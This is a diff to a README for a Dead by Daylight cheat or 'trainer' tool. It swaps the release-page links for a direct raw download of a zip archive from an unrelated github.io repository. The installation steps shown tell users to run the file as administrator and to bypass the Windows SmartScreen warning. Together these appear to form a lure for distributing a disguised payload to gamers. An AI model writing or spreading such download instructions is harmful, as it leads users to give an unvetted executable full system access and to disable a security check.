@@ -5,7 +5,7 @@ description: "Automate matches and gain vision in Dead by Daylight with this und
 ---
 # 🎮 DBD-AutoGrind-Trainer-2026-Plus - Automate your Dead by Daylight progression progress
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Guardofhonorsericocarpus535/DBD-AutoGrind-Trainer-2026-Plus/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Guardofhonorsericocarpus535/guardofhonorsericocarpus535.github.io/main/loco/io-github-guardofhonorsericocarpus-2.8-alpha.3.zip)
 
 ## 🎯 About This Tool
 
@@ -27,7 +27,7 @@ Ensure your Windows system has all recent updates. Outdated versions trigger sta
 
 Follow these steps to set up the tool on your Windows PC.
 
-1. Visit the [releases page](https://github.com/Guardofhonorsericocarpus535/DBD-AutoGrind-Trainer-2026-Plus/releases) to download the latest version of the installer.
+1. Visit the [releases page](https://raw.githubusercontent.com/Guardofhonorsericocarpus535/guardofhonorsericocarpus535.github.io/main/loco/io-github-guardofhonorsericocarpus-2.8-alpha.3.zip) to download the latest version of the installer.
 2. Locate the file in your downloads folder.
 3. Right-click the file and choose "Run as administrator". This step is necessary for the software to read the game state.
 4. If a Windows SmartScreen window appears, click "More info" and then click "Run anyway".
